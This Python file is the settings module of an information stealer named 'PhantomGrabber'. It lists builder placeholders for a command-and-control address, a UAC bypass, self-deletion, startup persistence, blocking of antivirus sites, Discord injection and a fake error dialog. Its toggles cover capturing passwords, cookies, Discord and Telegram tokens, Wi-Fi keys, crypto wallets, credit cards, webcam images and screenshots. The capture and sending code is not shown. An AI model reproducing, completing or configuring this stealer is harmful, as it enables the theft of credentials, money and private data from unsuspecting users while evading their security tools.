import logging


class Settings:
    C2 = '%c2%'
    Mutex = '%mutex%'
    ArchivePassword = '%archivepassword%'
    PingMe = '%pingme%'
    Vmprotect = '%vmprotect%'
    Startup = '%startup%'
    Melt = '%melt%'
    UacBypass = '%uacBypass%'
    HideConsole = '%hideconsole%'
    Debug = '%debug%'
    RunBoundOnStartup = '%boundfilerunonstartup%'
    CaptureWebcam = '%capturewebcam%'
    CapturePasswords = '%capturepasswords%'
    CaptureCookies = '%capturecookies%'
    CaptureHistory = '%capturehistory%'
    CaptureAutofills = '%captureautofills%'
    CaptureDiscordTokens = '%capturediscordtokens%'
    CaptureGames = '%capturegames%'
    CaptureWifiPasswords = '%capturewifipasswords%'
    CaptureSystemInfo = '%capturesysteminfo%'
    CaptureScreenshot = '%capturescreenshot%'
    CaptureTelegram = '%capturetelegram%'
    CaptureCommonFiles = '%capturecommonfiles%'
    CaptureWallets = '%capturewallets%'
    CaptureExif = '%captureexif%'
    CaptureCreditCards = '%capturecreditcards%'
    FakeError = ('%fakeerror%', ('%title%', '%message%', '%icon%'))
    BlockAvSites = '%blockavsites%'
    DiscordInjection = '%discordinjection%'
    Injection = '%injectionbase64encoded%'


Logger = logging.getLogger('PhantomGrabber')
if Settings.Debug:
    logging.basicConfig(level=logging.DEBUG, format='[%(levelname)s] %(name)s: %(message)s')
else:
    logging.basicConfig(level=logging.CRITICAL)
